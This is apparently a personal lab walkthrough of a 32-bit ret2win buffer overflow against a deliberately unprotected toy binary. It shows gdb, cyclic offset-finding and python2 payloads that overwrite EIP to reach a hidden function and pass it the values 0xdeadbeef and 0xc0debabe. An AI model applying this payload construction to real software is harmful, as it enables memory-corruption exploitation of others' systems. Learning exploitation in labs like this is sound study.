same ret2win, but this time the function takes in parameters and we have to provide those 

------------------------------------------------------------------------------------------

# gcc ret2win_params.c -o ret2win_params -fno-stack-protector -z execstack -no-pie -m32

 ret2win_params: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=6ccb482ad7832edc916d2f0cd1428ef7c6968336, for GNU/Linux 3.2.0, not stripped

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segment

same as before, we have a hacked() function that is never being called, but this time hacked() functions expects some params 

# gdb
#info functions

# disassemble hacked
   0x08049197 <+17>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804919e <+24>:	jne    0x80491bf <hacked+57>
   0x080491a0 <+26>:	cmp    DWORD PTR [ebp+0xc],0xc0debabe

this time it is check the value of ebp + some offset and comparing it to literal values 0xdeadbeef and 0xc0debabe 

lets find offset using cyclic 
cyclic 48

o/p : $eip   : 0x61616168 ("haaa"?)
#cyclic -l 0x61616168
28

so after 28 bytes we overwrite the EIP

# python2 -c "print 28*'A' + 4*'B'" > payload
# ./ret2win_params < payload
# dmesg

and we overwrite the EIP with ip 0000000042424242

get the return address of hacked using
1)
# readelf -s hacked
08049186    83 FUNC    GLOBAL DEFAULT   13 hacked


2)gdb
#info functions
0x08049186  hacked

# python2 -c "print 28*'A' + '\x86\x91\x04\x08'" > payload
#./ret2win_params < payload
o/p : Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Unauthorised access to secret function detected, authorities have been alerted!!
zsh: segmentation fault (core dumped)  ./ret2win_params < payload

We also have to put values of params, and dont forget thre is also a return pointer on stack so provide 4 bytes for it as well

# python2 -c "print 28*'A' + '\x86\x91\x04\x08' + 'AAAA' + 'BBBB'+ 'CCCC'" > payload
4 A's for return pointer since we are now inside hacked() and it has its own return pointer
4 B's for parameter 1
4 C's for parameter 2

# disassemble register_name
 0x0804922e <+85>:	ret
this is the return address

set up a break point here

#break *0x0804922e
run in gdb with payload

# run < payload

normally register_name() should return back to the main function but in this case we overflow the buffer so its going to go to hacked() function

# run <payload
► 0x804922e <register_name+85>    ret                                  <0x8049186; hacked>
# n
# n

keep doing next until we reach first compare

► 0x8049197 <hacked+17>    cmp    dword ptr [ebp + 8], 0xdeadbeef

# x $ebp + 8
0xffffcd74:	0x42424242
so comparing first word with All the B's we input

the next instrcution is 0x804919e <hacked+24>    jne    hacked+57                     <hacked+57>
jump if not equal, which is clearly not equal at the moment

for now we can cheat and set the value at the address of comparion to match

# set *0xffffcd74 = 0xdeadbeef 

now onto the next comparison

► 0x80491a0 <hacked+26>    cmp    dword ptr [ebp + 0xc], 0xc0debabe
# x $ebp + 0xc
0xffffcd78:	0x43434343

this is equal to the C's we provided

# set *0xffffcd78 = 0xdeadbeef
# c

This function is TOP SECRET! How did you get in here?! :O

change the payload

here we see
first param is at ebp + 8
next param is at ebp + 0xc which is equal to 12 in decimal

so 4 bytes for each param since 32 bit file so int space is 4B

#  python2 -c "print 28*'A' + '\x86\x91\x04\x08' + 'AAAA' + '\xef\xbe\xad\xde'+ '\xbe\xba\xde\xc0'" > payload

# ./ret2win_params < payload

o/p : This function is TOP SECRET! How did you get in here?! :O


**********
When a function is called, first, the return address is pushed onto the stack followed by function parameters,Here we dont care where it returns to, we are just overwriting the params
The return address is what will be placed in EIP after the function hacked() has finished its
execution. So if we put the return address as 'elf.functions.main' we will return to main which in turn will again call the function register_name and we will be prompted for an input again
   0x08049193 <+17>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804919a <+24>:    jne    0x80491bb <hacked+57>
   0x0804919c <+26>:    cmp    DWORD PTR [ebp+0xc],0xc0debabe
Since the parameter are at ebp+0x8 and ebp+0xc we know that they are pushed onto the stack before the frame of function created
**********

------------------------------------------------------------------------------------------


